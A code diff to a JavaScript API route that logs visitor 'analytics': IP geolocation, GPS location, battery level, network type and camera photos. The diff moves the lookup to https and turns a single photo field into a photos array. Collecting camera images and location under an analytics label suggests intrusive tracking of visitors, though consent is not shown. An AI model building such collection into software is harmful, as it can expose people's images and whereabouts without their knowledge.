@@ -33,8 +33,9 @@ export async function POST(request) {
     let ipLocation = null;
     try {
       const locationResponse = await fetch(
-        `http://ip-api.com/json/${clientIP}`
+        `https://ip-api.com/json/${clientIP}`
       );
+
       ipLocation = await locationResponse.json();
     } catch (error) {
       console.log("IP location fetch failed:", error);
@@ -77,7 +78,7 @@ export async function POST(request) {
         deviceInfo: true,
         location: !!location,
         battery: batteryLevel !== null,
-        camera: !!photo,
+        camera: Array.isArray(photos) && photos.length > 0,
         network: !!connectionType,
       },
     };
@@ -101,9 +102,9 @@ export async function POST(request) {
         deviceInfo: true,
         location: !!location,
         battery: batteryLevel !== null,
-        camera: !!photo,
+        camera: !!photos,
         network: !!connectionType,
-        photoSize: photo ? Math.round(photo.length * 0.75) : 0,
+        photoSize: photos ? Math.round(photos.length * 0.75) : 0,
       },
     });
   } catch (error) {
@@ -129,7 +130,7 @@ export async function GET(request) {
     }
 
     // Projection to optionally exclude photo data (to reduce response size)
-    const projection = includePhotos ? {} : { photo: 0 };
+    const projection = includePhotos ? {} : { photos: 0 };
 
     const analytics = await db
       .collection("analytics")
@@ -141,7 +142,8 @@ export async function GET(request) {
     // Add summary statistics
     const stats = {
       total: analytics.length,
-      withPhotos: analytics.filter((a) => a.photo).length,
+      withPhotos: analytics.filter((a) => a.photos && a.photos.length > 0)
+        .length,
       withLocation: analytics.filter((a) => a.location?.gps).length,
       devices: {
         mobile: analytics.filter((a) => a.deviceInfo?.device === "Mobile")
